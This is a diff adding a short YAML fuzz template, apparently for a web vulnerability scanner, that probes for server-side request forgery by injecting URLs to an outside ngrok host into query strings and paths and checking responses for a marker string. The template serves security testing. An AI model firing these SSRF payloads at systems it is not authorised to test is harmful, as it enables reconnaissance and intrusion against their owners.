@@ -1,0 +1,20 @@
+id: SSRF
+type: fuzz
+info:
+  name: SSRF
+  risk: High
+
+payloads: 
+  - http://d066a52d.ngrok.io/ssrf.txt
+  - d066a52d.ngrok.io/ssrf.txt
+
+requests:
+  - redirect: true
+  - generators:
+      - Query("{{.payload}}")
+      - Path("{{.payload}}", "*")
+
+  - detections:
+      - >-
+        StringSearch("response", "ssrfhere")
+
